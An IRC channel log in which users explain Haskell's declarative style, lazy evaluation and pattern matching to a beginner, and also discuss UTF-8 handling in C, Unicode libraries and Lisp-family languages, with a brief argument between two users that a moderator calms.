[23:05:02] <bjs> [itchyjunk]: it's basically a "do things one after the other" style of programming. "make this; update that; move that there" is imperative.  in English the imperative is what you use when you give commands.
[23:05:05] <sonny> font is large though
[23:05:27] <[itchyjunk]> ah, okay yes that's how programming has been for the most part
[23:05:39] <bjs> [itchyjunk]: well it's how *you* have been doing and thinking about programming :)
[23:05:45] <apotheon> ProfSimm: Okay, you get exactly one serious response to me on the meta-subject, because that comment of yours was so absurd.  Yes, I know what "ad hominem" is.  I majored in philosophy.  Logic is bread and butter to me.  Have a nice day.
[23:05:47] <[itchyjunk]> yes
[23:05:55] <apotheon> s/to me/from me/
[23:06:01] <[itchyjunk]> so how is haskell different?
[23:06:02] <ProfSimm> apotheon: this is called "argument from authority"
[23:06:05] <[itchyjunk]> i know about the no side effect
[23:06:08] <bjs> [itchyjunk]: to think about programming in a different style is no harder than thinking about it in this imperative style,  but you do have to go back and re-learn and re-think about a lot of it
[23:06:09] *** Quits: Duchess (~Duchess@2604:3d08:1:1b:564:6e0:6753:4df1) (Ping timeout: 256 seconds)
[23:06:11] <apotheon> It's called context.
[23:06:25] <sonny> [itchyjunk] referential transparency etc
[23:06:26] <ProfSimm> apotheon: just because you majored in philosophy doesn't mean you have any idea what ad hominem is. And demonstrating your don't, is relevant.
[23:06:35] <apotheon> fucking internet psychologists, telling other people what they are, feel, and think
[23:06:42] <[itchyjunk]> i did some recursion stuff in haskell
[23:06:55] <sonny> when I used a similar language, I just go to wikipedia and type the formulas in and I'm done
[23:06:57] <[itchyjunk]> i took a break because i didn't think learning datastructure in haskell was fesiable for me
[23:07:03] <ProfSimm> apotheon: I'm not telling you how to feel. The definition of "ad hominem" doesn't depend on what you feel, genius.
[23:07:08] <[itchyjunk]> what happened then? oh i tried learning untyped lambda calculus
[23:07:10] *** Quits: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[23:07:19] <[itchyjunk]> i guess i need some easy haskell exercises again
[23:07:20] <apotheon> also no reading comprehension showing in responses to me
[23:07:25] <bjs> [itchyjunk]: Haskell just works totally differently. It's very declarative (rather than imperative).  It uses functions as values a lot more readily than other languages do.  The way a Haskell program is evaluated ("run") is totally different to the way imperative languages work
[23:07:28] <sonny> [itchyjunk] should be, but no I don't think it's simple enough for a beginner
[23:07:57] <apotheon> ProfSimm: STOP TALKING AT ME
[23:08:01] <[itchyjunk]> so instead of "do this, do that" what is it?
[23:08:14] <GeDaMo> [itchyjunk]: it's about values
[23:08:15] <sonny> beginner data structures stuff is focused with the implementation, not the abstract representation
[23:08:21] <[itchyjunk]> hmm
[23:08:27] <bjs> [itchyjunk]: it's declarative,  so you say "this is that and that combined"
[23:08:35] <bjs> [itchyjunk]: rather than saying "to make this, take that, do this, then do that"
[23:08:39] *** Quits: Amp[m] (~amperture@2001:470:69fc:105::1:3535) (Quit: Client limit exceeded: 20000)
[23:08:40] <[itchyjunk]> ah
[23:08:49] <sonny> if you have material that is about the abstract part, I'd wager it's easier in haskell
[23:08:52] <bjs> it's clear they are two ways of speaking about the same thing,  but are different approaches
[23:08:54] *** Joins: Amp[m] (~amperture@2001:470:69fc:105::1:3535)
[23:08:55] <[itchyjunk]> set builder notation is declarative then
[23:08:57] *** Quits: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b) (Quit: My MacBook Air has gone to sleep. ZZZzzz…)
[23:09:02] <sonny> yeah
[23:09:03] <bjs> [itchyjunk]: yes, a lot of mathematical notation is declarative
[23:09:12] <bjs> [itchyjunk]: (hence why people think Haskell looks like "math")
[23:09:14] <[itchyjunk]> okay, so far so good
[23:09:30] <pulse> ProfSimm, please don't aggravate other users
[23:10:24] *** Joins: wildo (~lain6141@119.224.72.222)
[23:10:40] <ProfSimm> pulse: well I was aggravated by this "if you don't like C pointers it's because you are too stupid to understand their glory"
[23:10:50] <ProfSimm> pulse: anyway, that's over
[23:10:52] *** Joins: k3nn7 (~k3nn7@2a02:a31b:43e:aa80:30fe:2bba:9822:cd90)
[23:10:58] <bjs> [itchyjunk]: like in math when you write something like `y = 3*x + 7` then wherever you see "y" you understand you can replace it with the term "3*x + 7"  because that's what y is *declared* to be
[23:11:16] *** Joins: jjido (~Denis@2a02:c7f:5c91:e700:cd30:5759:3f90:149b)
[23:11:16] <bjs> [itchyjunk]: that's basically the idea (and gives you an insight into how a Haskell program "runs")
[23:11:24] <pulse> ProfSimm, fair enough but let's not drag it further
[23:11:28] <[itchyjunk]> yes, math should me more fimiliar to me then
[23:11:46] <sonny> error messages are total crap as usual tho
[23:11:59] <[itchyjunk]> error messages IRL are worse
[23:12:07] <[itchyjunk]> you mess up something and error message is death
[23:12:07] <bjs> [itchyjunk]: sure math is an obvious place, but like Python or Java, Haskell is a general-purpose language that you could do anything in.
[23:12:21] <apotheon> pulse: How ProfSimm characterized my argument is obviously phrased in bad faith.  I don't find it "fair enough" at all.
[23:12:36] <ProfSimm> Well ffs.
[23:12:37] <pulse> eh, let's just not drag it further
[23:12:56] <pulse> be nice, drink tea
[23:13:01] <pulse> live happy
[23:13:07] <ProfSimm> apotheon: I love C pointers suddenly. No point feeling bad about it. I apologize for any mischaracterization
[23:13:08] <[itchyjunk]> Ah yes, i was supposed to find and do exercises involving `map`
[23:13:16] <sonny> [itchyjunk] oh yeah math doesn't have error messages :(
[23:13:25] <bjs> [itchyjunk]: and Haskell itself has lots of extra bits to learn (its typesystem, typeclasses, datatypes, lazy evaluation etc).  Functional languages don't overlap nearly as much as say Java and Python do,  so a lot of these don't apply to other functional languages
[23:13:30] <apotheon> I'm fine, as long as ProfSimm doesn't keep talking shit about me like that obviously sarcastic apology.  "I love C pointers suddenly" indeed.
[23:13:34] <[itchyjunk]> it does, the 0 on your exam is the error message
[23:13:43] *** Joins: rtypo (~alex@user/rtypo)
[23:13:45] <bjs> [itchyjunk]: e.g. the way a Haskell program "runs" is totally different to the way an OCaml one does.  But the way a Python program runs is almost identical to the process Java uses.
[23:14:02] <sonny> wdym?
[23:14:02] <[itchyjunk]> damn, sonny said something about fp overlapping more and you said something else about fp not overlapping
[23:14:30] <ProfSimm> apotheon: well I apologize genuinely, I just wouldn't be honest if I take the whole situation entirely seriously. But I don't mean you to be left frustrated from this. 
[23:14:41] <bjs> [itchyjunk]: if anything, Haskell is a good example to the contrary. There are few (if any?) languages that are like Haskell.  For better or worse.
[23:14:41] *** Quits: anovick (~anovick@2a0d:6fc0:1ce2:c500::34d) (Read error: Connection reset by peer)
[23:14:43] <bjs> (sometimes both)
[23:14:57] <[itchyjunk]> we talked about "sharing concepts" between fps
[23:15:08] *** Joins: anovick (~anovick@2a0d:6fc0:1ce2:c500::34d)
[23:15:19] *** Quits: sub0 (~bc8147f2@cerf.good1.com) (Quit: CGI:IRC (Error))
[23:15:40] *** Joins: sub0 (~bc8147f2@cerf.good1.com)
[23:15:52] <sonny> programs run on an intepreter or bare metal
[23:15:54] <bjs> [itchyjunk]: I mean,  two functional programming languages share the same paradigm and so will be declarative and use functions (that's basically the definition of functional programming language).  But in general it's a more niche area so there are fewer languages, and the ones that do exist tend to have more differences.  Haskell is an extreme example here.
[23:16:08] <GeDaMo> My understanding is that Haskell was designed to consolidate similar languages like Miranda and Hope
[23:16:16] <sonny> yeah
[23:16:28] <bjs> [itchyjunk]: taking e.g. its lazy evaluation is not something any other (modern) functional language uses
[23:16:38] <sonny> miranda was not open, and they were using it for research to they made a new one
[23:16:48] <GeDaMo> Also Gofer
[23:16:49] <sonny> clean also came from that genesis
[23:17:05] <[itchyjunk]> why not?
[23:17:11] <[itchyjunk]> lazy evaluation seems important
[23:17:15] <sonny> miranda is "open" now, the code looks amazing
[23:17:15] <[itchyjunk]> you can talk about infinite lists
[23:17:20] <[itchyjunk]> how do you do that in modern FP languages?
[23:17:26] <bjs> [itchyjunk]: well, you have functions.
[23:17:39] <sonny> it got updated to c11, compilers in less than a second with only a c99 compiler and make
[23:18:19] <sonny> total dream of a language
[23:18:20] <GeDaMo> You could pass a state variable which is updated and returned along with the most recent value
[23:18:34] <bjs> [itchyjunk]: infinite lists can be implemented with functions (in many different ways), and in general a "lazy" computation can be a function. So the other languages aren't "losing" anything but not being lazy.
[23:18:57] <sonny> [itchyjunk] the other language communites all implement these concepts
[23:19:11] <[itchyjunk]> hmm i see
[23:19:16] <[itchyjunk]> i tohught maybe they were being lazy about it
[23:19:22] <sonny> heh
[23:19:23] <ProfSimm> Is there a language-independent way of naming parameters symbolically. I.e. not to use English words, but combine... semantic dimensions or something?
[23:19:42] <bjs> [itchyjunk]: why do they choose to be strict?  Well that's a hard question to answer,  there's lots of ways that being strict is simpler and the cases where it helps are debatable.  I've certainly seen arguments in both directions
[23:19:51] <bjs> but as it stands today, I don't think new languages would be lazy.
[23:19:53] <sonny> ProfSimm guuid?
[23:20:07] <[itchyjunk]> hmm i see
[23:20:22] <sonny> strict is not the term, it's eager
[23:20:26] <[itchyjunk]> if the advantages are obvious, would haskell get rid of lazy eval?
[23:20:32] <[itchyjunk]> or is it too core now to remove?
[23:20:44] <sonny> what advantage?
[23:20:45] <GeDaMo> I think there's a way to force strict evaluation in Haskell
[23:20:48] <ProfSimm> sonny: it's one way, but this is essentially a unique symbol for every parameter. What if we could somehow encode the meaning of the parameter from a set of "categories"
[23:21:02] <bjs> [itchyjunk]: Haskell cannot remove it (it's fundamental to what Haskell is), and you don't really get advantages by not having it
[23:21:13] <bjs> GeDaMo: yes there are bang patterns (and seq)
[23:21:29] <sonny> ProfSimm I don't follow ...
[23:21:29] *** Quits: medium_cool (~medium_co@2605:a601:a9aa:f800:f949:8533:c03:a236) (Quit: I have gone to sleep. ZZZzzz…)
[23:22:27] <ProfSimm> sonny: imagine you could decompose language and meaning into categories into a bunch of enums, like "colors: red, blue, green, yellow, ..."   "morality: good, bad" and so on. And then you express a parameter name as a set of these enums.
[23:22:54] <sonny> name or type?
[23:23:14] <ProfSimm> I don't know, I'm basically trying to figure out, do we have some alternative to 1) ordered arguments 2) named arguments
[23:23:20] <ProfSimm> What other approach is there
[23:23:21] <sonny> the name is unrelated
[23:23:29] <apotheon> Why would someone want to remove lazy evaluation from Haskell?
[23:23:33] <sonny> no, that's it
[23:24:08] <bjs> apotheon: well nobody wants to remove it entirely,  but sometimes you run into cases where you want to tell Haskell "no please, evaluate this."
[23:24:16] <apotheon> sure
[23:24:34] <apotheon> This, though, tripped me up:
[23:24:35] <apotheon> 12:50 < [itchyjunk]> if the advantages are obvious, would haskell get rid of lazy eval?
[23:24:35] <bjs> the classic examples are foldl patterns (accumulations) where you want Haskell to force the thunks as you go rather than lazily building up a huge computation just to collapse it at the end
[23:25:07] <sub0> bjs there's pro and cons to both. specifically, other languages are losing something by not being lazy by default. such as not being able to seamlessly use plain functions to make new language constructs  (alternatives exists, but they are messier (macros), or noisy (wrapping everything in lambda). 
[23:25:33] <A4L> One question. Is it allowed according to C standard/POSIX to pass unicode UTF-8 as arguments into a program? How is it possible to - in accordance to standards - use such UTF-8 values? Aren't only allowed declarations for main (void) and (int argc, char * argv[])? Since char cannot fit 8 bits inside and therefore only allows for US-ASCII range?
[23:25:35] <sub0> and maybe even more importantly, laziness by is more compatible with code reuse
[23:25:39] <sub0> by default*
[23:25:41] <apotheon> sub0: mismatched parenthesis error
[23:25:50] <apotheon> s/mis/un/
[23:26:34] <sub0> apotheon, yeah.. embarrassing, especially for someone who likes lisp
[23:27:04] <sonny> lazy eval sounds interesting for memory allocation, especially for lists
[23:27:04] <A4L> regarding question above - it can hold 8 bits but one goes for the sign
[23:27:16] <sonny> cause you are just generating it
[23:27:22] <Decker> https://www.wolframcloud.com/obj/47d3b68d-bb16-4c79-a0e4-8ab54f62c5b7  Hooray for 'smart' math... it's apparently trying to do other trig substitutions; there's no Csc[] anywhere... and no sqrt either.... I don't have any problem just doing the math straight up
[23:27:23] <apotheon> sub0: I just sometimes like to be a parser.  Don't mind me.
[23:28:38] <GeDaMo> A4L: the point about UTF-8 is it's a sequence of 8-bit values
[23:28:57] <A4L> So it's okay?
[23:29:00] <Decker> it is
[23:29:01] <GeDaMo> And the only zero byte is 0
[23:29:27] <Decker> the upper ones with sign, don't strcmp() right... but you should be doing a codepoint compare on utf8 (unless it's within ascii range)
[23:29:57] <A4L> Decker: why wouldn't they strcmp?
[23:30:05] <Decker> 0x80 < 'a'
[23:30:17] <A4L> Oh yeah I get it
[23:30:35] <A4L> But it still works for checking if string matches another.
[23:30:37] <apotheon> UTF-8 characters can be linked lists.
[23:30:37] <Decker> they will do like exact match... but you can't use the sorting
[23:30:41] <Decker> ya
[23:30:43] <A4L> apotheon: and that yes
[23:30:44] <apotheon> How's that for fun?
[23:30:50] <apotheon> I like that aspect of it.
[23:30:53] <GeDaMo> You have to be wary about using standard C string functions but as byte arrays, they're fine
[23:31:09] <Decker> yes
[23:31:22] <A4L> For sorting wchar would work, right?
[23:31:38] <Decker> not really - need to store 20 bits
[23:31:41] <Decker> 21
[23:31:44] <GeDaMo> wchar is a different thing from UTF-8
[23:31:49] <A4L> Yeah
[23:31:50] <pyzozord> there is now this library for utf8 graphmemes https://st.suckless.org/
[23:31:52] <bayaz> Title: st - simple terminal | suckless.org software that sucks less 
[23:31:58] <A4L> But to convert from UTF-8 to wchar
[23:32:02] <A4L> and then sort
[23:32:13] <pyzozord> I mean this https://libs.suckless.org/libgrapheme/
[23:32:14] <[itchyjunk]> argh i forgot the little haskell i knew
[23:32:15] <bayaz> Title: libraries | suckless.org software that sucks less 
[23:32:18] <[itchyjunk]> f x
[23:32:19] <Decker> there's surrogat epairs then that mess it up 0xd800-0xdfff
[23:32:33] <[itchyjunk]> if x == 'A' then return 'A'
[23:32:37] <[itchyjunk]> what's wrong with my syntax?
[23:32:44] <GeDaMo> Probably ==
[23:32:48] <GeDaMo> Also return
[23:32:57] <Decker> missing () ?
[23:33:00] <Decker> no then?
[23:33:03] <[itchyjunk]> it shouldn't be AA ?
[23:33:14] <[itchyjunk]> haskell doesn't have () and does have then
[23:33:20] <[itchyjunk]> it shouldn't be == *
[23:33:25] *** Joins: Duchess (~Duchess@24.109.185.150)
[23:33:29] <[itchyjunk]> i can't compare Char like that? hmm
[23:33:44] <bjs> [itchyjunk]: what are you trying to do?
[23:33:56] <[itchyjunk]> i want a f :: Char -> Char
[23:34:08] <[itchyjunk]> f 'a' should map to 'A'
[23:34:11] <bjs> [itchyjunk]: `let f x = if x == 'A' then 'A' else 'B'`
[23:34:13] <[itchyjunk]> if 'a' then return 'A'
[23:34:31] <[itchyjunk]> let me post code then
[23:34:47] <[itchyjunk]> https://bpa.st/7R2Q
[23:34:48] <bayaz> Title: View paste 7R2Q 
[23:35:06] <bjs> [itchyjunk]: you're missing an `=`, drop the `return` and you need an `else`
[23:35:27] <[itchyjunk]> argh, okay
[23:35:50] <[itchyjunk]> what is that concept called when i must have else?
[23:35:56] <[itchyjunk]> all cases must be met
[23:36:07] <[itchyjunk]> wait, that is something else, i don't think haskell forces this part
[23:36:15] <bjs> [itchyjunk]: forces what part?
[23:36:20] <[itchyjunk]> where everything thing in a domain must evaluate to something
[23:36:27] <[itchyjunk]> i think thats an adga thing
[23:37:01] <[itchyjunk]> How does one represent empty character in haskell?
[23:37:02] <sub0> total functional language?
[23:37:03] <[itchyjunk]> something like ''
[23:37:09] *** Joins: varaindemian (uid73404@id-73404.ilkley.irccloud.com)
[23:37:09] <bjs> [itchyjunk]: Haskell can have partial functions.  If you try evaluate a function which is not defined for the inputs you give it, you get an exception.
[23:37:17] <bjs> [itchyjunk]: there is no "empty character" ?
[23:37:19] <[itchyjunk]> sub0, the word starts with d, i can never remember
[23:37:23] <bjs> what would the empty character be
[23:37:23] <sub0> https://en.wikipedia.org/wiki/Total_functional_programming
[23:37:24] <bayaz> Title: Total functional programming - Wikipedia 
[23:37:29] <sub0> dependent types?
[23:37:32] *** Quits: varaindemian (uid73404@id-73404.ilkley.irccloud.com) (Client Quit)
[23:37:38] <[itchyjunk]> dependent thats the word
[23:37:39] <bjs> Dependent is not the right thing.
[23:37:46] <sub0> you can have dependent types without being total
[23:37:47] *** Joins: varaindemian (uid73404@id-73404.ilkley.irccloud.com)
[23:37:53] <[itchyjunk]> agda is dependently typed but not haskell?
[23:37:56] <apotheon> pyzozord: That's interesting.  Where A = libgrapheme's size as a percentage of libunistring, and B = libunistring's size as a percentage of ICU, A is less than half of B.
[23:38:01] <[itchyjunk]> hmm idk what total is :(
[23:38:02] <bjs> [itchyjunk]: yes, Haskell is not dependently typed.
[23:38:14] <sub0> [itchyjunk], see the link above
[23:38:16] <bjs> [itchyjunk]: total means what you said earlier, that all inputs in the domain are mapped to an output
[23:38:34] <[itchyjunk]> bjs, if 'a' then 'A' else {do nothing like just but '' there}
[23:38:39] <pyzozord> apotheon: that's what they were going for I think, it has some edge cases but for the most parts it just works in the fraction of the size
[23:38:43] <bjs> [itchyjunk]: "do nothing" sounds imperative to me!
[23:38:53] <bjs> [itchyjunk]: and that's not how Haskell works
[23:39:12] <[itchyjunk]> if 'a' then 'A' else ''!! this makes sense in my head
[23:39:19] <[itchyjunk]> null?
[23:39:20] <bjs> [itchyjunk]: but '' isn't a character
[23:39:27] <GeDaMo> [itchyjunk]: if x == 'a' then 'A' else x
[23:39:32] <[itchyjunk]> what's x ?
[23:39:42] <bjs> [itchyjunk]: what character do you want `toUpper 'b'` to be?
[23:39:42] <GeDaMo> The parameter in your function
[23:39:54] <[itchyjunk]> 'B'
[23:39:55] <ProfSimm> bjs: the more I think about Prolog, the more I understand why they did it that way for AI. We think in categories like this. Maybe one problem Prolog has is there's no "weight" to the relation. And there's no complex searches, like looking for multiple categories at once or something like that "I need something bouncy, red, and melon sized"
[23:40:09] <[itchyjunk]> but i wanted to be lazy, test 'a' then worry about B later
[23:40:10] <bjs> [itchyjunk]: then that should go in the else
[23:40:28] <bjs> [itchyjunk]: maybe what you want is a `case` statement, so you can lay out each "case"
[23:40:55] <bjs> rather than explicitly checking if x == 'a'  and then later if x == 'b' etc :)
[23:41:05] *** Joins: twomoon (~twomoon@ip72-199-116-21.sd.sd.cox.net)
[23:41:08] <apotheon> 40 vs. 2000 vs. 38000
[23:41:10] <apotheon> damn
[23:41:11] <[itchyjunk]> map toUpper "aaaaaaaaaaaaa"
[23:41:12] <[itchyjunk]> "AAAAAAAAAAAAA"
[23:41:17] *** Quits: sonny (~sonny@bras-base-london1483w-grc-32-70-52-175-166.dsl.bell.ca) (Ping timeout: 240 seconds)
[23:41:18] <[itchyjunk]> 20% of the task done
[23:41:37] <[itchyjunk]> hmm
[23:42:17] <[itchyjunk]> haskell case is that guard stuff right?
[23:42:24] <bjs> [itchyjunk]: "that guard stuff" ?
[23:42:35] <bjs> The `case` expression is pattern matching
[23:42:46] <[itchyjunk]> oh case is something other than guard, never used case
[23:42:53] <bjs> which is a very fundamental part of Haskell (and the related ML family of languages)
[23:44:19] <GeDaMo> f 'a' = 'A' ; f 'b' = 'B' ; f x = x
[23:45:06] <bjs> [itchyjunk]: i recommend reading something (a tutorial, a book, anything really) that'll cover the basics of Haskell and how to define functions and do pattern matching and stuff like that
[23:45:16] <apotheon> I have very limited experience with Haskell, but . . . I much prefer the experience of SML over that of Haskell, so far.
[23:45:21] <bjs> the syntax might be vaguely familiar but you'll probably makes lots of silly mistakes
[23:46:35] <user51> speaking of haskell, why learn it?
[23:46:47] <apotheon> to broaden your mind
[23:47:00] <[itchyjunk]> i can't read books, i'm illeterate
[23:47:02] <apotheon> (if you haven't already learned a language that would broaden it in a similar way)
[23:47:06] <[itchyjunk]> case needs to be exhaustive too
[23:47:09] <[itchyjunk]> i've run into same issue
[23:47:21] <user51> maybe a better question: say i'll never be able to learn haskell, what would i miss?
[23:47:31] <pyzozord> I'm thinking C is much better without the libc, if you just call syscalls directly from your c functions
[23:47:39] <bjs> [itchyjunk]: well you can always have a pattern that matches everything
[23:47:55] <bjs> [itchyjunk]: `_ -> undefined` or whatever
[23:48:03] <GeDaMo> C could do with a better strings library ... and a better I/O library
[23:48:30] <apotheon> I'm not familiar enough with Haskell to be sure, but . . . there are other languages that could probably introduce you to enough that there wouldn't be that much missed for lack of Haskell.
[23:48:35] <[itchyjunk]> _ -> ?
[23:48:37] <bjs> [itchyjunk]: although you should be allowed non-exhaustive patterns in a case,  there'll be a warning though probably
[23:48:39] <[itchyjunk]> what would the ? be
[23:48:40] <apotheon> Monads, maybe.
[23:48:44] <bjs> [itchyjunk]: undefined
[23:48:48] <[itchyjunk]> my brain tells me it should be '' haha
[23:48:50] <apotheon> One would have to learn those other languages, though.
[23:48:53] <[itchyjunk]> oh i cansay undefined?
[23:48:55] <bjs> [itchyjunk]: no it should be undefined.  
[23:48:58] <[itchyjunk]> literally just say it's undefined?
[23:49:06] <bjs> [itchyjunk]: yes, that's the partiality coming in
[23:49:13] <user51> http://man.cat-v.org/plan_9/2/string
[23:49:18] <bjs> [itchyjunk]: yes,  like I said, you should read a book and/or tutorial and/or do whatever you do normally :P
[23:49:22] <GeDaMo> toUpper should really return the character unchanged if it can't be uppercased
[23:49:35] <[itchyjunk]> GeDaMo, yes that would be nice
[23:49:44] <[itchyjunk]> like "a2" be "A2"
[23:49:54] <[itchyjunk]> GeDaMo, but do nothing is imperative
[23:50:06] <GeDaMo> toUpper 'a' = 'A' ; toUpper 'b' = 'B' ; toUpper x = x
[23:50:11] <pyzozord> GeDaMo: better strings and io for sure, i think stdio.h and string.h are the two biggest reasons for vulnerabilities and leaks
[23:50:18] <[itchyjunk]> GeDaMo, genius
[23:50:22] <bjs> [itchyjunk]: doing nothing isn't the same as "otherwise evaluates to x"
[23:51:21] <[itchyjunk]> its close enough in some high dimensional vector space
[23:51:28] <[itchyjunk]> AI overlord would understand what i mean
[23:51:46] <user51> i am the overflow overlord
[23:53:26] *** Joins: audiobirb (~audio@user/audio)
[23:53:59] <[itchyjunk]> https://bpa.st/ZEGQ
[23:54:01] <bayaz> Title: View paste ZEGQ 
[23:54:09] <[itchyjunk]> found this on google
[23:54:09] <[itchyjunk]> https://www.cantab.net/users/antoni.diller/haskell/questions/quest05.pdf
[23:54:13] <bayaz> Title: ACCESS DENIED 
[23:54:27] <Stefan26> some day ill learn haskell
[23:54:38] <[itchyjunk]> same
[23:54:39] <Stefan26> but hard to overcome the scaryness of words like "monad"
[23:54:41] <[itchyjunk]> not today though
[23:54:46] *** Joins: joe_colben (~joe____co@185.190.112.211)
[23:54:54] <[itchyjunk]> you don't even have to come across that for a long time
[23:55:05] <[itchyjunk]> plus it's just an endofunctor on the category of Hask
[23:55:24] <[itchyjunk]> just function, no scare
[23:56:29] <pyzozord> meh haskell, lisp is where it's at
[23:56:32] *** Quits: Booster2ooo (~Booster2o@user/booster2ooo) (Read error: Connection reset by peer)
[23:56:33] <pyzozord> code is data
[23:57:01] <apotheon> Homoiconicity is certainly cool.
[23:57:16] <apotheon> Red is apparently homoiconic.
[23:58:15] <pyzozord> (to be clear I too some day will 'some day i will learn haskell'
[23:58:15] <nomagno> There is SOME web framework or whatever I've never figured out the name of, but I can recognize it because of the exact message I get when I don't enable JavaScript on a website using it
[23:58:21] <GeDaMo> Red is an open source version of Rebol which has some very nice facilities for domain specific languages
[23:58:34] <apotheon> I should check on how far the Red team has ported things.  Last I checked, it seemed like they'd given up (temporarily, at least) on porting it to more platforms.
[23:58:38] <nomagno> "Javascript is required. Why? Awesome incremental search. Increased performance. (Implicit) have a horrible day"
[23:59:07] *** Quits: julian[m]123 (~julianjul@2001:470:69fc:105::1:428f) (Quit: Client limit exceeded: 20000)
[23:59:47] <apotheon> GeDaMo: REBOL seemed to actually be dropping platforms from support, last I checked.
[23:59:54] *** Joins: eddof13 (~textual@2806:102e:12:4fba:a0ad:8e00:9345:9060)
[23:59:57] *** Quits: vysn (~vysn@user/vysn) (Ping timeout: 240 seconds)
[23:59:58] <GeDaMo> Possibly
